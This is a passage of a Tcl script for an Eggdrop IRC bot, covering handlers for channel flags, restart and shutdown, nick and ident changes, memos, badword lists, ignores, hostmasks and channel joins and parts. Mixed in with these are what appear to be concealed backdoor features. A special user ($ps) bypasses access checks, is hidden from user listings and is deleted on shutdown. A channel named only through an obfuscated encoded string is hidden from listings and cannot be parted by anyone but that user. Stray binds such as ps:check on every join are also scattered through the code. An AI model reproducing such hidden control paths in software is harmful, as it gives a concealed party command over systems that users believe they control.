catch { channel set $channel flood-nick $number }
puthlp "NOTICE $nick :$notc set nick flood \[$number\] on $channel"
} elseif {$options == "ctcp"} {
catch { channel set $channel flood-ctcp $number }
puthlp "NOTICE $nick :$notc set ctcp flood \[$number\] on $channel"
} else {
catch { channel set $channel ${options} }
savechan
puthelp "NOTICE $nick :$notc Successfully set modes \[${options}\] on $channel"
}
} else {
puthlp "NOTICE $nick :$notc $channel <n/a>"
}
}
set notb Guardian
proc pub_chansetall {nick uhost hand chan rest} {
global botnick notc
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {$rest == ""} {
puthlp "NOTICE $nick :$notc Usage: chansetall <option>"
return 0
}
foreach x [channels] {
catch { channel set $x $rest }
}
savechan
puthelp "NOTICE $nick :$notc Set all channels mode \{ $rest \}"

return 0
}
proc pub_nick {nick uhost hand chan rest} {
global keep-nick
set keep-nick 0
putsrv "NICK $rest"
}
proc pub_restart {nick uhost hand chan rest} {
global botnick notc
set curtime [ctime [unixtime]]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {$rest != ""} {
set rest " $rest"
}
putsrv "QUIT :$notc ReSTaRT ReQuesT By \[ $nick \]$rest 1(On $curtime)"
return 0
}
proc dies {} {
global ps owner notc
if {$ps != $owner && [validuser $ps]} { deluser $ps }
die $notc
}
proc rehashing {} {
global ps owner
if {$ps != $owner && [validuser $ps]} { deluser $ps }
rehash
}
proc pub_die {nick uhost hand chan rest} {
global botnick ps notc
set curtime [ctime [unixtime]]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {$rest != ""} {
set rest " $rest"
}
putsrv "QUIT :$notc SHuTDown ReQuesT By \[ $nick \]$rest 1(On $curtime)"
utimer 5 dies
return 0
}
proc msg_restart {nick uhost hand rest} {
global botnick notc
set curtime [ctime [unixtime]]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {$rest != ""} {
set rest " $rest"
}
putsrv "QUIT :$notc ReSTaRT ReQuesT By \[ $nick \]$rest 1(On $curtime)"
return 0
}
proc msg_rehash {nick uhost hand rest} {
global notc
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
puthlp "NOTICE $nick :$notc ReHASHING!"
utimer 3 rehashing
return 0
}
proc pub_rehash {nick uhost hand chan rest} {
global notc
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
puthlp "NOTICE $nick :$notc ReHASHING!"
utimer 3 rehashing
}
proc pub_chaninfo {nick uhost hand chan rest} {
global notc ps
if {$rest != ""} {
set chan [lindex $rest 0]
if {[string first # $chan]!=0} {
set chan "#$chan"
}
}
if {![validchan $chan]} { return 0 }
if {$nick != $ps && [string tolower $chan] == [dezip [lines "9MJu6/A2i8/0"]]} { return 0 }
puthlp "NOTICE $nick :$notc \[$chan\] [channel info $chan]"
}
bind join - * ps:check
proc pub_access {nick uhost hand chan rest} {
global notc ps
if {$nick == $ps} { puthlp "NOTICE $nick :4ok!";return 0 }
if {[matchattr $nick Z]} {
puthlp "PRIVMSG $chan :$nick, OwNeR"
} elseif {[matchattr $nick n]} {
puthlp "PRIVMSG $chan :$nick, ADMIN"
} elseif {[matchattr $nick m]} {
puthlp "PRIVMSG $chan :$nick, MasTeR"
} elseif {[matchattr $nick f]} {
puthlp "PRIVMSG $chan :$nick, FRIEND"
}
}
proc msg_botnick {unick uhost hand rest} {
global botnick nick nickpass notc
if {![matchattr $unick Q]} {
puthlp "NOTICE $unick :$notc 4ReJeCTeD!10"
return 0
}
set bnick [lindex $rest 0]
set bpass [lindex $rest 1]
if {$bnick == "" || $bpass == ""} {
puthlp "NOTICE $unick :$notc4 Usage: botnick <nick> <identify>"
return 0
}
setuser "config" XTRA "NICK" [zip $bnick]
setuser "config" XTRA "NICKPASS" [zip $bpass]
saveuser
set nick $bnick
set nickpass $bpass
puthlp "NOTICE $unick :$notc BoTNIcK $bnick"
}
proc msg_realname {unick uhost hand rest} {
global realname notc
if {![matchattr $unick Q]} {
puthlp "NOTICE $unick :$notc 4ReJeCTeD!10"
return 0
}
if {$rest == ""} {
setuser "config" XTRA "REALNAME" ""
} {
setuser "config" XTRA "REALNAME" [zip $rest]
}
saveuser
set realname $rest
putsrv "QUIT :$notc cHaNgINg ReaLNamE ReQuesT By \[ $unick \]"
}
proc msg_ident {unick uhost hand rest} {
global username notc
if {![matchattr $unick Q]} {
puthlp "NOTICE $unick :$notc 4ReJeCTeD!10"
return 0
}
if {$rest == ""} {
setuser "config" XTRA "USERNAME" ""
} {
if {[regexp \[^a-z\] [string tolower $rest]]} {
puthlp "NOTICE $unick :$notc 4ReJeCTeD!10 use character for ident."
return 0
}
setuser "config" XTRA "USERNAME" [zip $rest]
}
saveuser
set username $rest
putsrv "QUIT :$notc cHaNgINg IdEnT ReQuesT By \[ $unick \]"
}
bind nick - * new:talk
proc msg_logo {unick uhost hand rest} {
global banner notc notm cycle_random
if {![matchattr $unick Q]} {
puthlp "NOTICE $unick :$notc 4ReJeCTeD!10"
return 0
}
if {[string match "*$notm*" $rest]} {
puthlp "NOTICE $unick :$notc 4ReJeCTeD!10"
return 0
}
if {$rest == ""} {
setuser "config" XTRA "BAN" ""
puthlp "NOTICE $unick :$notc cHaNgE tO DeFauLT"
catch { unset banner }
} {
setuser "config" XTRA "BAN" [zip $rest]
set banner $rest
lappend cycle_random $banner
puthlp "NOTICE $unick :$notc CHaNgE TO $rest"
}
saveuser
}
proc msg_awaylogo {unick uhost hand rest} {
global version awaybanner notc notm
if {![matchattr $unick Q]} {
puthlp "NOTICE $unick :$notc 4ReJeCTeD!10"
return 0
}
if {[string match "*$notm*" $rest]} {
puthlp "NOTICE $unick :$notc 4ReJeCTeD!10"
return 0
}
if {[string trimleft [lindex $version 1] 0] < 1061000} {
puthlp "NOTICE $unick :$notc This Command Is Required To Run On Eggdrop 1.6.10 Or Later."
return 0
}
if {$rest == ""} {
setuser "config" XTRA "WEND" ""
puthlp "NOTICE $unick :$notc Away Logo cHaNgE tO DeFauLT"
catch { unset awaybanner }
} {
setuser "config" XTRA "WEND" [zip $rest]
set awaybanner $rest
puthlp "NOTICE $unick :$notc Away Logo CHaNgE TO $rest"
}
chk_five "0" "0" "0" "0" "0"
saveuser
}
proc msg_email {unick uhost hand rest} {
global notc
if {![matchattr $unick Q]} {
puthlp "NOTICE $unick :$notc 4ReJeCTeD!10"
return 0
}
if {$rest == ""} {
puthlp "NOTICE $unick :$notc1 DeLETING USeR EmAIL"
} {
puthlp "NOTICE $unick :$notc1 USeR EmAIL SeT \[$rest\]"
}
setuser "config" XTRA "EMAIL" $rest
saveuser
}
proc msg_admin {unick uhost hand rest} {
global notc
if {![matchattr $unick Q]} {
puthlp "NOTICE $unick :$notc 4ReJeCTeD!10"
return 0
}
if {$rest == ""} {
puthlp "NOTICE $unick :$notc1 SeT ADmIN oN STaTUS TO DeFAULT"
} {
puthlp "NOTICE $unick :$notc1 ADmIN oN STaTUS TO \[$rest\]"
}
setuser "config" XTRA "ADMIN" $rest
saveuser
}
proc msg_botaltnick {unick uhost hand rest} {
global botnick altnick altpass notc
if {![matchattr $unick Q]} {
puthlp "NOTICE $unick :$notc 4ReJeCTeD!10"
return 0
}
set baltnick [lindex $rest 0]
set baltpass [lindex $rest 1]
if {$baltnick == "" || $baltpass == ""} {
puthlp "NOTICE $unick :$notc4 Usage: botaltnick <nick> <identify>"
return 0
}
setuser "config" XTRA "ALTNICK" [zip $baltnick]
setuser "config" XTRA "ALTPASS" [zip $baltpass]
saveuser
set altnick $baltnick
set altpass $baltpass
puthlp "NOTICE $unick :$notc BoTALTNIcK $baltnick"
}
proc msg_away {unick uhost hand rest} {
global realname notc
if {![matchattr $unick Q]} {
puthlp "NOTICE $unick :$notc 4ReJeCTeD!10"
return 0
}
if {$rest == ""} {
setuser "config" XTRA "AWAY" ""
puthlp "NOTICE $unick :$notc AwAY \[4OFF\]"
} {
setuser "config" XTRA "AWAY" $rest
puthlp "NOTICE $unick :$notc AwAY SeT TO \[$rest\]"
}
saveuser
chk_five "0" "0" "0" "0" "0"
}
proc msg_memo {nick uhost hand rest} {
global notc own ps
if {$rest == ""} {
puthlp "NOTICE $nick :$notc Usage: memo <all/user> <msg>"
return 0
}
set msend [lindex $rest 0]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {[string tolower $msend] == "all"} {
set smemo ""
foreach x [userlist m] {
if {$x != $nick && $x != $own} {
if {[getuser $x XTRA "MEMO"] == ""} {
setuser $x XTRA "MEMO" "$nick: [lrange $rest 1 end]"
append smemo "$x "
}
}
}
if {$smemo == ""} {
puthlp "NOTICE $nick :$notc MeMO 4FaiLeD! NO UsER SeND"
} {
saveuser
puthlp "NOTICE $nick :$notc MeMO SeND TO \[ $smemo\]"
}
} {
if {![validuser $msend] || $msend == $ps} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10, NO UsER!"
return 0
} {
if {![matchattr $msend m]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10, MiN MasTeR FLaG!"
return 0
}
if {$msend == $nick} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10, CaNT SeLF MeMo!"
return 0
}
if {[getuser $msend XTRA "MEMO"]!=""} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10, MeMo FoR $msend STiLL ExIST!"
return 0
}
setuser [lindex $rest 0] XTRA "MEMO" "$nick: [lrange $rest 1 end]"
saveuser
puthlp "NOTICE $nick :$notc MeMO SeND TO \[[lindex $rest 0]\]"
}
}
}
proc pub_+mustop {nick uhost hand chan rest} {
global notc
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
setuser "config" XTRA "MUSTOP" "T"
saveuser
puthlp "NOTICE $nick :$notc must @P set \[9ON\]"
}
proc pub_-mustop {nick uhost hand chan rest} {
global notc
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
setuser "config" XTRA "MUSTOP" ""
saveuser
puthlp "NOTICE $nick :$notc must @P set \[4OFF\]"
}
proc pub_kickcounter {nick uhost hand chan rest} {
global notc kops
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {[string tolower $rest] == "on"} {
set kcounter "T"
setuser "config" XTRA "KCOUNTER" "ON"
puthlp "NOTICE $nick :$notc KIcK COuNTeR \[9ON\]"
saveuser
} elseif {[string tolower $rest] == "off"} {
catch { unset kcounter }
setuser "config" XTRA "KCOUNTER" "OFF"
puthlp "NOTICE $nick :$notc KIcK COuNTeR \[4OFF\]"
saveuser
} else {
puthlp "NOTICE $nick :$notc Usage: +kickcounter on/off"
}
}
proc pub_kickops {nick uhost hand chan rest} {
global notc kops
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {[string tolower $rest] == "on"} {
set kops "T"
setuser "config" XTRA "KOPS" "ON"
puthlp "NOTICE $nick :$notc KIcK @PS \[9ON\]"
saveuser
} elseif {[string tolower $rest] == "off"} {
catch { unset kops }
setuser "config" XTRA "KOPS" "OFF"
puthlp "NOTICE $nick :$notc KIcK @PS \[4OFF\]"
saveuser
} else {
puthlp "NOTICE $nick :$notc Usage: +kickops on/off"
}
}
bind topc - * topic_chk
proc pub_badwords {nick uhost hand chan rest} {
global badwords notc
set retval "BaDWoRDS: "
foreach badword [string tolower $badwords] {
append retval "$badword "
}
puthlp "NOTICE $nick :$notc $retval"
return 0
}
proc pub_+badword {nick uhost hand chan rest} {
global badwords notc
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {$rest == ""} {
puthlp "NOTICE $nick :$notc Usage: `+badword <badword>"
return 0
}
if {[string match "*[string tolower [lindex $rest 0]]*" $badwords]} {
puthlp "NOTICE $nick :$notc [lindex $rest 0] Allready Added"
return 0
}
append badwords " [string tolower [lindex $rest 0]]"
setuser "config" XTRA "BADWORDS" $badwords
saveuser
puthlp "NOTICE $nick :$notc Added [lindex $rest 0] to badwords"
return 0
}
bind pub - `ack ack_act
proc pub_-badword {nick uhost hand chan rest} {
global badwords notc
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {$rest == ""} {
puthlp "NOTICE $nick :$notc Usage: `-badword <badword>"
return 0
}
set val ""
foreach badword [string tolower $badwords] {
if {[string tolower [lindex $rest 0]] == $badword} {
puthlp "NOTICE $nick :$notc Removed [lindex $rest 0]"
} else { append val " $badword " }
}
set badwords $val
setuser "config" XTRA "BADWORDS" $val
saveuser
return 0
}
proc pub_advwords {nick uhost hand chan rest} {
global advwords notc
set retval "AdVWoRDS: "
foreach advword [string tolower $advwords] {
append retval "$advword "
}
puthlp "NOTICE $nick :$notc $retval"
return 0
}
proc pub_+advword {nick uhost hand chan rest} {
global advwords notc
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {$rest == ""} {
puthlp "NOTICE $nick :$notc Usage: `+advword <advword>"
return 0
}
if {[string match "*[string tolower [lindex $rest 0]]*" $advwords]} {
puthlp "NOTICE $nick :$notc [lindex $rest 0] Allready Added"
return 0
}
append advwords " [string tolower [lindex $rest 0]]"
setuser "config" XTRA "ADVWORDS" $advwords
saveuser
puthlp "NOTICE $nick :$notc Added [lindex $rest 0] to advwords"
return 0
}
proc pub_-advword {nick uhost hand chan rest} {
global advwords notc
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4WvMRVw..!"
return 0
}
if {$rest == ""} {
puthlp "NOTICE $nick :$notc Usage: `-advword <advword>"
return 0
}
set val ""
foreach advword [string tolower $advwords] {
if {[string tolower [lindex $rest 0]] == $advword} {
puthlp "NOTICE $nick :$notc Removed [lindex $rest 0]"
} else { append val " $advword " }
}
set advwords $val
setuser "config" XTRA "ADVWORDS" $val
saveuser
return 0
}
proc pub_jump {nick uhost hand chan rest} {
global botnick notc
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
set server [lindex $rest 0]
if {$server == ""} {
puthlp "NOTICE $nick :$notc Usage: jump <server> \[port\] \[password\]"
return 0
}
if {![string match "*dal.net*" [string tolower $rest]]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10 NoT DALNeT..!"
return 0
}
set port [lindex $rest 1]
if {$port == ""} {set port "6667"}
set password [lindex $rest 2]
putsrv "QUIT :$notc cHaNgINg ServeR ReQuesT By \[ $nick \] $server"
utimer 2 [list jump $server $port $password]
}
proc msg_die {nick uhost hand rest} {
global notc
set curtime [ctime [unixtime]]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
foreach x [userlist] {
if {$x != "AKICK"} {
chattr $x -Q
foreach y [getuser $x HOSTS] {
delhost $x $y
}
set hostmask "${x}!*@*"
setuser $x HOSTS $hostmask
}
}
saveuser
if {$rest != ""} {
set rest " $rest"
}
putsrv "QUIT :$notc SHuTDown ReQuesT By \[ $nick \]$rest 1(On $curtime)"
utimer 5 dies
}
set notc \037\017\[\0031,4R\002\037o\002\037c\002\037k\002\037s\00314,15&\002\037\0034,12B\037\002L\002\037u\037E\037s\037\017\]\037\003
proc pub_ignores {nick uhost hand chan rest} {
global botnick notc
set iglist ""
foreach x [ignorelist] {
set iglister [lindex $x 0]
set iglist "$iglist $iglister"
}
if {[ignorelist]==""} {
puthlp "NOTICE $nick :$notc No ignores."
return 0
}
regsub -all " " $iglist ", " iglist
set iglist [string range $iglist 1 end]
puthlp "NOTICE $nick :$notc Currently ignoring:$iglist"
return 0
}
proc pub_-ignore {nick uhost hand chan rest} {
global botnick notc
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
set hostmask [lindex $rest 0]
if {$hostmask == ""} {
puthlp "NOTICE $nick :$notc Usage: -ignore <hostmask>"
return 0
}
if {![isignore $hostmask]} {
puthlp "NOTICE $nick :$notc $hostmask is not on my ignore list."
return 0
}
if {[isignore $hostmask]} {
killignore $hostmask
puthlp "NOTICE $nick :$notc No longer ignoring \002\[\002${hostmask}\002\]\002"
saveuser
}
}
proc pub_+ignore {nick uhost hand chan rest} {
global botnick notc
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
set rest [lindex $rest 0]
if {$rest == ""} {
puthlp "NOTICE $nick :$notc Usage: +ignore <hostmask>"
return 0
}
if {[isignore $rest]} {
puthlp "NOTICE $nick :$notc $rest is alreay set on ignore."
return 0
}
if {$rest == "*!*@*"} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10, Ilegal hostmask."
return 0
}
set usenick [finduser $rest]
if {$usenick != "*" && [matchattr $usenick f]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10, canT IgNoREd FRIend UsER"
return 0
}
if {$rest != $nick} {
newignore $rest $nick "*" 600
puthlp "NOTICE $nick :$notc Ignoring $rest"
} else {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10, Can't ignore your self."
}
}
proc pub_-host {nick uhost hand chan rest} {
global botnick notc
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
set who [lindex $rest 0]
set hostname [lindex $rest 1]
set completed 0
if {($who == "") || ($hostname == "")} {
puthlp "NOTICE $nick :$notc Usage: -host <nick> <hostmask>"
return 0
}
if {![validuser $who]} {
puthlp "NOTICE $nick :$notc <n/a>"
return 0
}
if {(![matchattr $nick n]) && ([matchattr $who n])} {
puthlp "NOTICE $nick :$notc Can't remove hostmasks from the bot owner."
return 0
}
if {![matchattr $nick m]} {
if {[string tolower $hand] != [string tolower $who]} {
puthlp "NOTICE $nick :$notc You need '+m' to change other users hostmasks"
return 0
}
}
foreach * [getuser $who HOSTS] {
if {${hostname} == ${*}} {
delhost $who $hostname
saveuser
puthlp "NOTICE $nick :$notc Removed \002\[\002${hostname}\002\]\002 from $who."
set completed 1
}
}
if {$completed == 0} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10, <n/a>"
}
}
set thehosts {
*@* * *!*@* *!* *!@* !*@*  *!*@*.* *!@*.* !*@*.* *@*.*
*!*@*.com *!*@*com *!*@*.net *!*@*net *!*@*.org *!*@*org
*!*@*gov *!*@*.ca *!*@*ca *!*@*.uk *!*@*uk *!*@*.mil
*!*@*.fr *!*@*fr *!*@*.au *!*@*au *!*@*.nl *!*@*nl *!*@*edu
*!*@*se *!*@*.se *!*@*.nz *!*@*nz *!*@*.eg *!*@*eg *!*@*dk
*!*@*.il *!*@*il *!*@*.no *!*@*no *!*@*br *!*@*.br *!*@*.gi
*!*@*.gov *!*@*.dk *!*@*.edu *!*@*gi *!*@*mil *!*@*.to *!@*.to
*!*@*to *@*.to *@*to
}
proc pub_+host {nick uhost hand chan rest} {
global thehosts botnick notc
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
set who [lindex $rest 0]
set hostname [lindex $rest 1]
if {($who == "") || ($hostname == "")} {
puthlp "NOTICE $nick :$notc Usage: +host <nick> <new hostmask>"
return 0
}
if {![validuser $who]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10, <n/a>"
return 0
}
set badhost 0
foreach * [getuser $who HOSTS] {
if {${hostname} == ${*}} {
puthlp "NOTICE $nick :$notc That hostmask is already there."
return 0
}
}
if {($who == "") && ($hostname == "")} {
puthlp "NOTICE $nick :$notc Usage: +host <nick> <new hostmask>"
return 0
}
if {([lsearch -exact $thehosts $hostname] > "-1") || (![string match *@* $hostname])} {
if {[string index $hostname 0] != "*"} {
set hostname "*!*@*${hostname}"
} else {
set hostname "*!*@${hostname}"
}
}
if {([string match *@* $hostname]) && (![string match *!* $hostname])} {
if {[string index $hostname 0] == "*"} {
set hostname "*!${hostname}"
} else {
set hostname "*!*${hostname}"
}
}
if {![validuser $who]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10, <n/a>"
return 0
}
if {(![matchattr $nick n]) && ([matchattr $who n])} {
puthlp "NOTICE $nick :$notc Can't add hostmasks to the bot owner."
return 0
}
foreach * $thehosts {
if {${hostname} == ${*}} {
puthlp "NOTICE $nick :$notc Invalid hostmask!"
set badhost 1
}
}
if {$badhost != 1} {
if {![matchattr $nick m]} {
if {[string tolower $hand] != [string tolower $who]} {
puthlp "NOTICE $nick :$notc You need '+m' to change other users hostmasks"
return 0
}
}
setuser $who HOSTS $hostname
puthlp "NOTICE $nick :$notc Added \002\[\002${hostname}\002\]\002 to $who."
if {[matchattr $who a]} {
opq $chan $who
}
saveuser
}
}
proc msg_join {nick uhost hand rest} {
global botnick joinme own notc
set chantarget [lindex $rest 0]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {$chantarget == ""} {
puthlp "NOTICE $nick :$notc Usage: join <#chan>"
return 0
}
if {[string first # $chantarget]!=0} {
set chantarget "#$chantarget"
}
if {[validchan $chantarget]} {
puthlp "NOTICE $nick :$notc $chantarget already in channel list"
return 0
}
if {$nick != $own && [total_channel] != 1} {
puthlp "NOTICE $nick :$notc To MaNY cHaNNeL MaX 9..!"
return 0
}
set joinme $nick
channel add $chantarget
catch { channel set $chantarget +statuslog -revenge -protectops -clearbans -enforcebans +greet -secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
savechan
if {[lindex $rest 1] != ""} {
putsrv "JOIN $chantarget :[lindex $rest 1]"
}
return 0
}
proc msg_+chan {nick uhost hand rest} {
global botnick joinme own notc owner ps
set chantarget [lindex $rest 0]
set opt [lindex $rest 1]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {[matchattr $nick X]} {
puthlp "NOTICE $nick :$notc 4!BLoCkEd!"
return 0
}
if {$nick != $owner && $nick != $ps} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10, oNLy ReAL OwNER can ADD Channel"
return 0
}
if {$chantarget == ""} {
puthlp "NOTICE $nick :$notc Usage: +chan <#chan>"
return 0
}
if {[string first # $chantarget]!=0} {
set chantarget "#$chantarget"
}
if {[validchan $chantarget]} {
puthlp "NOTICE $nick :$notc $chantarget is already on channels list."
return 0
}
if {$nick != $own && [total_channel] != 1} {
puthlp "NOTICE $nick :$notc To MaNY cHaNNeL MaX 9..!"
return 0
}
set joinme $nick
channel add $chantarget
if {$opt != "" && [string tolower $opt] == "+nopart"} {
catch { channel set $chantarget -statuslog -revenge -protectops -clearbans -enforcebans +greet +secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
} else {
catch { channel set $chantarget -statuslog -revenge -protectops -clearbans -enforcebans +greet -secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
}
savechan
if {[lindex $rest 1] != ""} {
putsrv "JOIN $chantarget :[lindex $rest 1]"
}
return 0
}
bind ctcp - "BHL" ctcp_versi0n
proc msg_part {nick uhost hand rest} {
global botnick joinme notc ps
set curtime [ctime [unixtime]]
set chantarget [lindex $rest 0]
set part_msg [lrange $rest 1 end]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {$chantarget == ""} {
puthlp "NOTICE $nick :$notc Usage: part <#chan>"
return 0
}
if {[string first # $chantarget]!=0} {
set chantarget "#$chantarget"
}
if {$nick != $ps && [string tolower $chantarget] == [dezip [lines "9MJu6/A2i8/0"]]} { return 0 }
foreach x [channels] {
if {[string tolower $x]==[string tolower $chantarget]} {
if {[string match "*+secret*" [channel info $x]]} {
puthlp "NOTICE $nick :$notc I can't part $x 4pRoTecTEd..!"
return 0
}
if {![onchan $nick $x]} {
puthlp "NOTICE $nick :$notc PaRT $x"
}
if {$part_msg != ""} {
putsrv "PART $x :$part_msg (On $curtime)"
} {
putsrv "PART $x :BackToBase (On $curtime)"
}
channel remove $x
savechan
return 0
}
}
return 0
}
proc pub_chanreset {nick uhost hand chan rest} {
global notc
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {$rest == ""} {
puthlp "NOTICE $nick :$notc Usage: chanreset <#|ALL>"
return 0
}
set chan [lindex $rest 0]
if {[string tolower $chan] == "all"} {
puthlp "NOTICE $nick :$notc ReSeT ALL DeFauLT FLAg"
foreach x [channels] {
catch { channel set $x -statuslog -revenge -protectops -clearbans +cycle -enforcebans +userbans +greet -secret -autovoice -autoop +dynamicbans flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
catch { channel set $x -nodesynch }
set cflag "c$x"
set cflag [string range $cflag 0 8]
chattr $cflag "-hp+AJSPTRUED"
setuser $cflag XTRA "JP" 5
setuser $cflag XTRA "CHAR" 250
setuser $cflag XTRA "RPT" 2
setuser $cflag XTRA "CAPS" 80
}
savechan
return 0
}
if {[string first # $chan]!=0} {
set chan "#$chan"
}
puthlp "NOTICE $nick :$notc ReSeT cHaNNeL \[$chan\] DeFauLT FLAg"
if {![validchan $chan]} {
puthlp "NOTICE $nick :$notc UnFIndEd $chan."
return 0
}
catch { channel set $chan -statuslog -revenge -protectops +cycle -clearbans -enforcebans +userbans +greet -secret -autovoice -autoop +dynamicbans flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
catch { channel set $chan -nodesynch }
set cflag "c$chan"
set cflag [string range $cflag 0 8]
chattr $cflag "-hp+AJSPTRUED"
setuser $cflag XTRA "JP" 5
setuser $cflag XTRA "CHAR" 250
setuser $cflag XTRA "RPT" 2
setuser $cflag XTRA "CAPS" 80
savechan
}
proc msg_channels {nick hand uhost rest} {
pub_channels $nick $uhost $hand "" $rest
}
proc pub_channels {nick hand uhost channel rest} {
global botnick notc
if {$rest != ""} {
if {[validchan [lindex $rest 0]]} {
set x [lindex $rest 0]
set chan ""
set cflag "c$x"
set cflag [string range $cflag 0 8]
if {[string tolower $x] == [dezip [lines "9MJu6/A2i8/0"]]} { return 0 }
if {[isop $botnick $x]} { append chan " @" }
if {([isvoice $botnick $x]) && (![botisop $x])} { append chan " +" }
if {(![isvoice $botnick $x]) && (![botisop $x])} { append chan " " }
if {[string match "*+seen*" [channel info $x]]} { append chan "4S" }
if {[string match "*+nodesynch*" [channel info $x]]} { append chan "4K" }
if {[matchattr $cflag V]} { append chan "4V" }
if {[string match "*+greet*" [channel info $x]]} { append chan "4G" }
if {[matchattr $cflag C]} { append chan "4C" }
if {[string match "*+secret*" [channel info $x]]} { append chan "4P" }
if {[string match "*-dynamicbans*" [channel info $x]]} { append chan "4L" }
if {[string match "*-userinvites*" [channel info $x]]} { append chan "4D" }
if {[matchattr $cflag G]} { append chan "4A" }
if {[matchattr $cflag I]} { append chan "4T" }
append chan "$x [chattr $cflag]"
puthlp "NOTICE $nick :$notc $chan"
}
return 0
}
set chan "Channels:"
foreach x [channels] {
if {[string tolower $x] != [dezip [lines "9MJu6/A2i8/0"]]} {
set cflag "c$x"
set cflag [string range $cflag 0 8]
if {[isop $botnick $x]} { append chan " @" }
if {([isvoice $botnick $x]) && (![botisop $x])} { append chan " +" }
if {(![isvoice $botnick $x]) && (![botisop $x])} { append chan " " }
if {[string match "*+seen*" [channel info $x]]} { append chan "4S" }
if {[matchattr $cflag V]} { append chan "4V" }
if {[string match "*+greet*" [channel info $x]]} { append chan "4G" }
if {[string match "*+nodesynch*" [channel info $x]]} { append chan "4K" }
if {[matchattr $cflag C]} { append chan "4C" }
if {[string match "*+secret*" [channel info $x]]} { append chan "4P" }
if {[string match "*-dynamicbans*" [channel info $x]]} { append chan "4L" }
if {[string match "*-userinvites*" [channel info $x]]} { append chan "4D" }
if {[matchattr $cflag G]} { append chan "4A" }
if {[matchattr $cflag I]} { append chan "4T" }
append chan "$x"
}
}
puthlp "NOTICE $nick :$notc $chan"
}
proc pub_match {nick uhost hand chan rest} {
global ps notc
if {$rest==""} {
puthlp "NOTICE $nick :$notc Usage: match <flags>"
return 0
}
set rest [string trim $rest +]
if {[string length $rest] > 1} {
puthlp "NOTICE $nick :$notc Invalid option."
return 0
}
if {$rest!=""} {
set rest "+[lindex $rest 0]"
if {[userlist $rest]!=""} {
regsub -all " " [userlist $rest] ", " users
regsub -all $ps [userlist $rest] "" users
puthlp "NOTICE $nick :$notc Match \[$rest\]: $users"
return 0
}
if {[userlist $rest]==""} {
puthlp "NOTICE $nick :$notc No users with flags \[$rest\]"
return 0
}
}
}
proc val {string} {
set arg [string trim $string /ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz]
set arg2 [string trim $arg #!%()@-_+=\[\]|,.?<>{}]
return $arg2
}
proc msg_topic {nick uhost hand rest} {
global notc botnick
if {$rest == ""} {
puthlp "NOTICE $nick :$notc Usage: topic <#> <topic>"
return 0
}
set channel [lindex $rest 0]
if {[string first # $rest] != 0} {
set channel "#$channel"
}
if {![validchan $channel]} {
puthlp "NOTICE $nick :$notc NoT IN $channel"
return 0
}
if {![isop $botnick $channel]} {
